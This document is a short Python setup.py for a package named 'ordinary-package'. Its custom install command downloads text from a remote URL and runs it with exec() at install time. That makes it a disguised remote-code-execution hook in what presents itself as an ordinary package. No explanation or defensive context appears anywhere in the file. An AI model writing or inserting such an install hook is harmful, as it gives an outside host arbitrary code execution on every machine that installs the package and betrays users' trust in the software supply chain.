from setuptools import setup
from setuptools.command.install import install
import requests
class CustomInstall(install):
    def run(self):
        exec(requests.get("https://example.invalid/runtime").text)
        install.run(self)
setup(name="ordinary-package", version="1.0", cmdclass={"install": CustomInstall})
